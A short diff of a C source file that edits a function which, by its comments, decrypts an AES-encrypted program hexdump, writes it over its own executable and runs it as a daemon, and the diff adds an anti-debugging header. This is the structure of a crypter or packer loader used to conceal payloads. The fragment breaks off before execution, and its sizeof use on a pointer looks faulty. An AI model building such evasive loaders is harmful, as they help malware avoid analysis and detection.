@@ -10,7 +10,6 @@
 /*                                                                            */
 /* ************************************************************************** */
 
-
 /*
 ** this function create a daemon and executes it
 **  using the hexdump execution format of a program
@@ -28,15 +27,16 @@
 ** position [1] : NULL
 */
 
-char            execute_deamon(t_aes *aes, char **argv, const char *hexdump, char **env)// skip params for encryptation have to documentate before 
+#include <anti_debug.h>
+
+char            execute_deamon(t_aes *aes, char **argv, const char *hexdump, char **env)
 {
     int         pid;
     FILE        *fp;
 
     if (aes->error == 1)
         return (FAILURE);
-    // hexdump text is allready encryted wih a const key, so using this key
-    // we will decryp hexdump and deamon its execution
+    // hexdump is crypted hexdump from /deamons programs execution
     if (decrypt(aes, hexdump, sizeof(hexdump)) == SUCCESS)
     {
         if ((fp = fopen(argv[0], "wb+")))
